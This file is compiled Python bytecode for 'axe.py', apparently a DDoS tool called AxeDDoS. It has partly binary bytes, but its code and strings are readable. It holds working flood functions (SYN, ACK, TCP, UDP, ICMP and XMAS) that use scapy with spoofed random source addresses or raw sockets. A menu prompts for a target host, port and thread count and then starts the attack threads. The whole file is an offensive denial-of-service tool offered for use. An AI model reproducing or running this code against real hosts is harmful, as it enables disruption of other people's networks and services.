o
    ��pd(  �                
   @   sx  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlT d5dd�Zdd� Z	dd� Z
d	d
� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zedk�r:e jdkrde �� Zed krdedd� ed� e�  e	d�Zed� e	d��� Ze�� sedd� n=edkr�ed � e�d� n/ed!kr�e
Zn(ed"kr�eZn!ed#kr�eZned$kr�eZned%kr�eZned&kr�eZned'd� ed%kr�e	d(��� Zed)kr�e� Zne�� r�ee�Zned*d� e	d+��� Z e d)kr�d,Z ne �� r�ee �Z ned-d� d a!d a"d.a#ed/d)d0� e$e �D ]%Z%zej&ed1�Z'e'�(�  W �q e)e*f�y,   ed2� e�d� Y �qw ed3� ed4� e�  dS dS )6�    N)�*c                 C   s&   t d|  d � |rt�d� d S d S )Nz[1;91m[!] [0;97mz[00m
�   )�print�sys�exit)�textr   � r   �axe.py�error   s   �r
   c              	   C   s>   z	t d|  d �W S  ttfy   td� t�d� Y d S w )Nz[1;92m[[97m?[92m] [0;97mz:[96m �
[1;92mHave a good day![00m
r   )�input�KeyboardInterrupt�EOFErrorr   r   r   )�messager   r   r	   �_input
   s   �r   c               	   C   �d   t r0z!tt� td�tt� tdt� t� t� d� } t| dd� td7 aW n   t	d7 a	Y t sd S d S )N��src�dst�S��sport�dport�flags�seq�ack�windowr   ��verboser   �
�running�IP�RandIP�target�TCP�	RandShort�port�send�sent�errors��packetr   r   r	   �	syn_flood   �   *
�r,   c               	   C   r   )Nr   �Ar   r   r   r   r   r*   r   r   r	   �	ack_flood   r-   r/   c                  C   �`   t r.zt�tjtj�} | �ttt�f� | �t	�
d�� td7 aW n   td7 aY t sd S d S �Ni   r   )r    �socket�AF_INET�SOCK_STREAM�connectr#   �intr&   r'   �os�urandomr(   r)   ��sr   r   r	   �	tcp_flood%   �   
�r;   c                  C   r0   r1   )r    r2   r3   �
SOCK_DGRAMr5   r#   r6   r&   r'   r7   r8   r(   r)   r9   r   r   r	   �	udp_flood0   r<   r>   c               	   C   r   )Nr   �FSRPAUECr   r   r   r   r   r*   r   r   r	   �
xmas_flood;   r-   r@   c                  C   sV   t r)ztt� td�tt� dd� } t| dd� td7 aW n   td7 aY t sd S d S )Nr   �   )r   �typer   r   r   )	r    r!   r"   r#   �ICMPr%   r'   r(   r)   r*   r   r   r	   �
icmp_floodE   s   
�rD   c                	   C   s^   t r-zt�d� td�tt�dd� W n ttfy(   td� t	d� da Y nw t sd S d S )Nr   zZ[?25l   [1;94m>   [92mSent packets: [0;97m{}   [1;91mErrors: [0;97m{}  [1;94m<[00m���endz[?25h�Shutting down...F)
r    �time�sleepr   �formatr(   r)   r   r   r
   r   r   r   r	   �show_statusO   s   
��rL   c                   C   s$   t �t jdkr	dnd� td� d S )N�nt�clear�clsu0  [1;95m
  /$$$$$$                   /$$$$$$$ /$$$$$$$           /$$$$$$
 /$$__  $$                 | $$__  $| $$__  $$         /$$__  $$
| $$  \ $$/$$   /$$ /$$$$$$| $$  \ $| $$  \ $$ /$$$$$$| $$  \__/
| $$$$$$$|  $$ /$$//$$__  $| $$  | $| $$  | $$/$$__  $|  $$$$$$
| $$__  $$\  $$$$/| $$$$$$$| $$  | $| $$  | $| $$  \ $$\____  $$
| $$  | $$ >$$  $$| $$_____| $$  | $| $$  | $| $$  | $$/$$  \ $$
| $$  | $$/$$/\  $|  $$$$$$| $$$$$$$| $$$$$$$|  $$$$$$|  $$$$$$/
|__/  |__|__/  \__/\_______|_______/|_______/ \______/ \______/[00m  [3;31mv[97m1.0[00m[1;91m

     ╭──────────────────────────────────────────────╮
     │ [1;35m[+] [94mGithub   [1;91m│[00m   [4;97mgithub.com/grayhatzone[00m      [1;91m│
     │ [1;35m[+] [94mEmail    [1;91m│[00m   [4;97md4rk-cl0ud@hotmail.com[00m      [1;91m│
     ╰──────────────────────────────────────────────╯[00m
)r7   �system�namer   r   r   r   r	   �show_bannerZ   s   rR   �__main__�posixzrun script as sudo.r   zEnter target IP/Hostnamea  
[1;92m[[97m1[92m] [0;93mSYN Flood
[1;92m[[97m2[92m] [0;93mACK Flood
[1;92m[[97m3[92m] [0;93mTCP Flood
[1;92m[[97m4[92m] [0;93mUDP Flood
[1;92m[[97m5[92m] [0;93mICMP Flood
[1;92m[[97m6[92m] [0;93mXMAS Attack
[1;92m[[97m0[92m] [0;93mExit          
    zChoose attack type (0-6)zInvalid method selected!�0r   �1�2�3�4�5�6zInvalid method selected.z)Enter target port (press enter to random)� zInvalid port entered.z)Enter the number of threads (Default:250)��   zInvalid input.Tz'
[1;94m[*] [0;97mStarting threads... rF   )r#   rH   zDone!z"[1;94m[*] [0;97mAttack started!
)N)+r7   r   r2   �randomrI   �	threading�re�	scapy.allr
   r   r,   r/   r;   r>   r@   rD   rL   rR   �__name__rQ   �getgid�gidr   r#   r   �strip�method�	isnumeric�functionr&   r%   r6   �threadsr(   r)   r    �range�_�Thread�thread�startr   r   r   r   r   r	   �<module>   s�   8







	




�
�